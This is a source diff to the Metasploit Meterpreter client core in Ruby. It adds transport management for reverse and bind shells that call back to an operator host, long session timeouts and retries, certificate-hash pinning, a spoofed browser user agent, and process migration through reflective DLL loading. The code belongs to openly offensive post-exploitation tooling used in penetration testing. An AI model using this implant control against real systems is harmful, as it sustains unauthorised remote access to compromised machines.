@@ -8,8 +8,12 @@ require 'rex/post/meterpreter/client'
 # argument for moving the meterpreter client into the Msf namespace.
 require 'msf/core/payload/windows'
 
-# Provides methods to patch options into the metsrv stager.
-require 'rex/payloads/meterpreter/patch'
+# URI uuid and checksum stuff
+require 'msf/core/payload/uuid'
+require 'rex/payloads/meterpreter/uri_checksum'
+
+# certificate hash checking
+require 'rex/parser/x509_certificate'
 
 module Rex
 module Post
@@ -28,6 +32,24 @@ class ClientCore < Extension
   UNIX_PATH_MAX = 108
   DEFAULT_SOCK_PATH = "/tmp/meterpreter.sock"
 
+  METERPRETER_TRANSPORT_SSL   = 0
+  METERPRETER_TRANSPORT_HTTP  = 1
+  METERPRETER_TRANSPORT_HTTPS = 2
+
+  TIMEOUT_SESSION = 24*3600*7  # 1 week
+  TIMEOUT_COMMS = 300          # 5 minutes
+  TIMEOUT_RETRY_TOTAL = 60*60  # 1 hour
+  TIMEOUT_RETRY_WAIT = 10      # 10 seconds
+
+  VALID_TRANSPORTS = {
+    'reverse_tcp'   => METERPRETER_TRANSPORT_SSL,
+    'reverse_http'  => METERPRETER_TRANSPORT_HTTP,
+    'reverse_https' => METERPRETER_TRANSPORT_HTTPS,
+    'bind_tcp'      => METERPRETER_TRANSPORT_SSL
+  }
+
+  include Rex::Payloads::Meterpreter::UriChecksum
+
   #
   # Initializes the 'core' portion of the meterpreter client commands.
   #
@@ -40,6 +62,92 @@ class ClientCore < Extension
   # Core commands
   #
   ##
+
+  #
+  # Get a list of loaded commands for the given extension.
+  #
+  def get_loaded_extension_commands(extension_name)
+    request = Packet.create_request('core_enumextcmd')
+    request.add_tlv(TLV_TYPE_STRING, extension_name)
+
+    begin
+      response = self.client.send_packet_wait_response(request, self.client.response_timeout)
+    rescue
+      # In the case where orphaned shells call back with OLD copies of the meterpreter
+      # binaries, we end up with a case where this fails. So here we just return the
+      # empty list of supported commands.
+      return []
+    end
+
+    # No response?
+    if response.nil?
+      raise RuntimeError, "No response was received to the core_enumextcmd request.", caller
+    elsif response.result != 0
+      # This case happens when the target doesn't support the core_enumextcmd message.
+      # If this is the case, then we just want to ignore the error and return an empty
+      # list. This will force the caller to load any required modules.
+      return []
+    end
+
+    commands = []
+    response.each(TLV_TYPE_STRING) { |c|
+      commands << c.value
+    }
+
+    commands
+  end
+
+  def transport_list
+    request = Packet.create_request('core_transport_list')
+    response = client.send_request(request)
+
+    result = {
+      :session_exp => response.get_tlv_value(TLV_TYPE_TRANS_SESSION_EXP),
+      :transports  => []
+    }
+
+    response.each(TLV_TYPE_TRANS_GROUP) { |t|
+      result[:transports] << {
+        :url          => t.get_tlv_value(TLV_TYPE_TRANS_URL),
+        :comm_timeout => t.get_tlv_value(TLV_TYPE_TRANS_COMM_TIMEOUT),
+        :retry_total  => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_TOTAL),
+        :retry_wait   => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_WAIT),
+        :ua           => t.get_tlv_value(TLV_TYPE_TRANS_UA),
+        :proxy_host   => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_HOST),
+        :proxy_user   => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_USER),
+        :proxy_pass   => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_PASS),
+        :cert_hash    => t.get_tlv_value(TLV_TYPE_TRANS_CERT_HASH)
+      }
+    }
+
+    result
+  end
+
+  def set_transport_timeouts(opts={})
+    request = Packet.create_request('core_transport_set_timeouts')
+
+    if opts[:session_exp]
+      request.add_tlv(TLV_TYPE_TRANS_SESSION_EXP, opts[:session_exp])
+    end
+    if opts[:comm_timeout]
+      request.add_tlv(TLV_TYPE_TRANS_COMM_TIMEOUT, opts[:comm_timeout])
+    end
+    if opts[:retry_total]
+      request.add_tlv(TLV_TYPE_TRANS_RETRY_TOTAL, opts[:retry_total])
+    end
+    if opts[:retry_wait]
+      request.add_tlv(TLV_TYPE_TRANS_RETRY_WAIT, opts[:retry_wait])
+    end
+
+    response = client.send_request(request)
+
+    {
+      :session_exp  => response.get_tlv_value(TLV_TYPE_TRANS_SESSION_EXP),
+      :comm_timeout => response.get_tlv_value(TLV_TYPE_TRANS_COMM_TIMEOUT),
+      :retry_total  => response.get_tlv_value(TLV_TYPE_TRANS_RETRY_TOTAL),
+      :retry_wait   => response.get_tlv_value(TLV_TYPE_TRANS_RETRY_WAIT)
+    }
+  end
 
   #
   # Loads a library on the remote meterpreter instance.  This method
@@ -153,28 +261,170 @@ class ClientCore < Extension
     if mod.nil?
       raise RuntimeError, "No modules were specified", caller
     end
-    # Get us to the installation root and then into data/meterpreter, where
-    # the file is expected to be
-    modname = "ext_server_#{mod.downcase}"
-    path = MeterpreterBinaries.path(modname, client.binary_suffix)
 
-    if opts['ExtensionPath']
-      path = ::File.expand_path(opts['ExtensionPath'])
+    # Query the remote instance to see if commands for the extension are
+    # already loaded
+    commands = get_loaded_extension_commands(mod.downcase)
+
+    # if there are existing commands for the given extension, then we can use
+    # what's already there
+    unless commands.length > 0
+      # Get us to the installation root and then into data/meterpreter, where
+      # the file is expected to be
+      modname = "ext_server_#{mod.downcase}"
+      path = MetasploitPayloads.meterpreter_path(modname, client.binary_suffix)
+
+      if opts['ExtensionPath']
+        path = ::File.expand_path(opts['ExtensionPath'])
+      end
+
+      if path.nil?
+        raise RuntimeError, "No module of the name #{modname}.#{client.binary_suffix} found", caller
+      end
+
+      # Load the extension DLL
+      commands = load_library(
+          'LibraryFilePath' => path,
+          'UploadLibrary'   => true,
+          'Extension'       => true,
+          'SaveToDisk'      => opts['LoadFromDisk'])
     end
 
-    if path.nil?
-      raise RuntimeError, "No module of the name #{modname}.#{client.binary_suffix} found", caller
-    end
-
-    # Load the extension DLL
-    commands = load_library(
-        'LibraryFilePath' => path,
-        'UploadLibrary'   => true,
-        'Extension'       => true,
-        'SaveToDisk'      => opts['LoadFromDisk'])
+    # wire the commands into the client
     client.add_extension(mod, commands)
 
     return true
+  end
+
+  def uuid(timeout=nil)
+    request = Packet.create_request('core_uuid')
+
+    args = [ request ]
+    args << timeout if timeout
+    response = client.send_request(*args)
+
+    id = response.get_tlv_value(TLV_TYPE_UUID)
+
+    return Msf::Payload::UUID.new({:raw => id})
+  end
+
+  def machine_id(timeout=nil)
+    request = Packet.create_request('core_machine_id')
+
+    args = [ request ]
+    args << timeout if timeout
+
+    response = client.send_request(*args)
+
+    mid = response.get_tlv_value(TLV_TYPE_MACHINE_ID)
+
+    # Normalise the format of the incoming machine id so that it's consistent
+    # regardless of case and leading/trailing spaces. This means that the
+    # individual meterpreters don't have to care.
+
+    # Note that the machine ID may be blank or nil and that is OK
+    Rex::Text.md5(mid.to_s.downcase.strip)
+  end
+
+  def transport_remove(opts={})
+    request = transport_prepare_request('core_transport_remove', opts)
+
+    return false unless request
+
+    client.send_request(request)
+
+    return true
+  end
+
+  def transport_add(opts={})
+    request = transport_prepare_request('core_transport_add', opts)
+
+    return false unless request
+
+    client.send_request(request)
+
+    return true
+  end
+
+  def transport_change(opts={})
+    request = transport_prepare_request('core_transport_change', opts)
+
+    return false unless request
+
+    client.send_request(request)
+
+    return true
+  end
+
+  def transport_sleep(seconds)
+    return false if seconds == 0
+
+    request = Packet.create_request('core_transport_sleep')
+
+    # we're reusing the comms timeout setting here instead of
+    # creating a whole new TLV value
+    request.add_tlv(TLV_TYPE_TRANS_COMM_TIMEOUT, seconds)
+    client.send_request(request)
+    return true
+  end
+
+  def transport_next
+    request = Packet.create_request('core_transport_next')
+    client.send_request(request)
+    return true
+  end
+
+  def transport_prev
+    request = Packet.create_request('core_transport_prev')
+    client.send_request(request)
+    return true
+  end
+
+  #
+  # Enable the SSL certificate has verificate
+  #
+  def enable_ssl_hash_verify
+    # Not supported unless we have a socket with SSL enabled
+    return nil unless self.client.sock.type? == 'tcp-ssl'
+
+    request = Packet.create_request('core_transport_setcerthash')
+
+    hash = Rex::Text.sha1_raw(self.client.sock.sslctx.cert.to_der)
+    request.add_tlv(TLV_TYPE_TRANS_CERT_HASH, hash)
+
+    client.send_request(request)
+
+    return hash
+  end
+
+  #
+  # Disable the SSL certificate has verificate
+  #
+  def disable_ssl_hash_verify
+    # Not supported unless we have a socket with SSL enabled
+    return nil unless self.client.sock.type? == 'tcp-ssl'
+
+    request = Packet.create_request('core_transport_setcerthash')
+
+    # send an empty request to disable it
+    client.send_request(request)
+
+    return true
+  end
+
+  #
+  # Attempt to get the SSL hash being used for verificaton (if any).
+  #
+  # @return 20-byte sha1 hash currently being used for verification.
+  #
+  def get_ssl_hash_verify
+    # Not supported unless we have a socket with SSL enabled
+    return nil unless self.client.sock.type? == 'tcp-ssl'
+
+    request = Packet.create_request('core_transport_getcerthash')
+    response = client.send_request(request)
+
+    return response.get_tlv_value(TLV_TYPE_TRANS_CERT_HASH)
   end
 
   #
@@ -201,7 +451,7 @@ class ClientCore < Extension
     }
 
     # We cant migrate into a process that does not exist.
-    if process.nil?
+    unless process
       raise RuntimeError, "Cannot migrate into non existent process", caller
     end
 
@@ -359,7 +609,96 @@ class ClientCore < Extension
     true
   end
 
+  #
+  # Indicates if the given transport is a valid transport option.
+  #
+  def valid_transport?(transport)
+    if transport
+      VALID_TRANSPORTS.has_key?(transport.downcase)
+    else
+      false
+    end
+  end
+
   private
+
+  def transport_prepare_request(method, opts={})
+    unless valid_transport?(opts[:transport]) && opts[:lport]
+      return nil
+    end
+
+    if opts[:transport].starts_with?('reverse')
+      return false unless opts[:lhost]
+    else
+      # Bind shouldn't have lhost set
+      opts[:lhost] = nil
+    end
+
+    transport = VALID_TRANSPORTS[opts[:transport]]
+
+    request = Packet.create_request(method)
+
+    scheme = opts[:transport].split('_')[1]
+    url = "#{scheme}://#{opts[:lhost]}:#{opts[:lport]}"
+
+    if opts[:comm_timeout]
+      request.add_tlv(TLV_TYPE_TRANS_COMM_TIMEOUT, opts[:comm_timeout])
+    end
+
+    if opts[:session_exp]
+      request.add_tlv(TLV_TYPE_TRANS_SESSION_EXP, opts[:session_exp])
+    end
+
+    if opts[:retry_total]
+      request.add_tlv(TLV_TYPE_TRANS_RETRY_TOTAL, opts[:retry_total])
+    end
+
+    if opts[:retry_wait]
+      request.add_tlv(TLV_TYPE_TRANS_RETRY_WAIT, opts[:retry_wait])
+    end
+
+    # do more magic work for http(s) payloads
+    unless opts[:transport].ends_with?('tcp')
+      if opts[:uri]
+        url << '/' unless opts[:uri].start_with?('/')
+        url << opts[:uri]
+        url << '/' unless opts[:uri].end_with?('/')
+      else
+        sum = uri_checksum_lookup(:connect)
+        url << generate_uri_uuid(sum, opts[:uuid]) + '/'
+      end
+
+      # TODO: randomise if not specified?
+      opts[:ua] ||= 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'
+      request.add_tlv(TLV_TYPE_TRANS_UA, opts[:ua])
+
+      if transport == METERPRETER_TRANSPORT_HTTPS && opts[:cert]
+        hash = Rex::Parser::X509Certificate.get_cert_file_hash(opts[:cert])
+        request.add_tlv(TLV_TYPE_TRANS_CERT_HASH, hash)
+      end
+
+      if opts[:proxy_host] && opts[:proxy_port]
+        prefix = 'http://'
+        prefix = 'socks=' if opts[:proxy_type] == 'socks'
+        proxy = "#{prefix}#{opts[:proxy_host]}:#{opts[:proxy_port]}"
+        request.add_tlv(TLV_TYPE_TRANS_PROXY_HOST, proxy)
+
+        if opts[:proxy_user]
+          request.add_tlv(TLV_TYPE_TRANS_PROXY_USER, opts[:proxy_user])
+        end
+        if opts[:proxy_pass]
+          request.add_tlv(TLV_TYPE_TRANS_PROXY_PASS, opts[:proxy_pass])
+        end
+      end
+
+    end
+
+    request.add_tlv(TLV_TYPE_TRANS_TYPE, transport)
+    request.add_tlv(TLV_TYPE_TRANS_URL, url)
+
+    return request
+  end
+
 
   def generate_payload_stub(process)
     case client.platform
@@ -380,11 +719,9 @@ class ClientCore < Extension
 
     # Include the appropriate reflective dll injection module for the target process architecture...
     if process['arch'] == ARCH_X86
-      c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
-      binary_suffix = "x86.dll"
+      c.include( ::Msf::Payload::Windows::MeterpreterLoader )
     elsif process['arch'] == ARCH_X86_64
-      c.include( ::Msf::Payload::Windows::ReflectiveDllInject_x64 )
-      binary_suffix = "x64.dll"
+      c.include( ::Msf::Payload::Windows::MeterpreterLoader_x64 )
     else
       raise RuntimeError, "Unsupported target architecture '#{process['arch']}' for process '#{process['name']}'.", caller
     end
@@ -392,41 +729,13 @@ class ClientCore < Extension
     # Create the migrate stager
     migrate_stager = c.new()
 
-    dll = MeterpreterBinaries.path('metsrv',binary_suffix)
-    if dll.nil?
-      raise RuntimeError, "metsrv.#{binary_suffix} not found", caller
-    end
-    migrate_stager.datastore['DLL'] = dll
-
-    blob = migrate_stager.stage_payload
-
-    if client.passive_service
-
-      #
-      # Patch options into metsrv for reverse HTTP payloads
-      #
-      Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
-        :ssl            =>  client.ssl,
-        :url            =>  self.client.url,
-        :expiration     => self.client.expiration,
-        :comm_timeout   =>  self.client.comm_timeout,
-        :ua             =>  client.exploit_datastore['MeterpreterUserAgent'],
-        :proxyhost      =>  client.exploit_datastore['PROXYHOST'],
-        :proxyport      =>  client.exploit_datastore['PROXYPORT'],
-        :proxy_type     =>  client.exploit_datastore['PROXY_TYPE'],
-        :proxy_username =>  client.exploit_datastore['PROXY_USERNAME'],
-        :proxy_password =>  client.exploit_datastore['PROXY_PASSWORD']
-
-    end
+    blob = migrate_stager.stage_meterpreter
 
     blob
   end
 
   def generate_linux_stub
-    file = ::File.join(Msf::Config.data_directory, "meterpreter", "msflinker_linux_x86.bin")
-    blob = ::File.open(file, "rb") {|f|
-      f.read(f.stat.size)
-    }
+    blob = MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
 
     blob
   end
